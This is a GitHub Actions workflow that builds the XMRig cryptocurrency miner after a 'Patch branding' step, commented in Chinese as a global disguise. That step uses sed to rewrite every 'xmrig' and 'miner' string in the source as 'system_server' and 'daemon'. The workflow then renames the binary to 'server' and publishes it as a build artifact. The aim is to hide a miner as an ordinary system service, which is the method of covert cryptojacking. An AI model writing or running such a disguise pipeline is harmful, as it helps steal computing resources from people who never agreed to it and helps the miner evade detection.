name: Build System

on:
  workflow_dispatch:

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - name: Install dependencies
        run: sudo apt-get update && sudo apt-get install -y build-essential cmake git libuv1-dev libssl-dev libhwloc-dev

      # 🔥 全局伪装改名：xmrig → system_server
      - name: Patch branding
        run: |
          find . -type f -name "*.h" -o -name "*.cpp" -o -name "*.hpp" -o -name "CMakeLists.txt" | xargs sed -i '
            s/xmrig/system_server/g
            s/XMRig/SystemServer/g
            s/XMRIG/SYSTEM_SERVER/g
            s/miner/daemon/g
            s/Miner/Daemon/g
          '

      - name: Build
        run: |
          mkdir build && cd build
          cmake ..
          make -j$(nproc)
          mv system_server server

      - name: Upload
        uses: actions/upload-artifact@v4
        with:
          name: server
          path: build/server
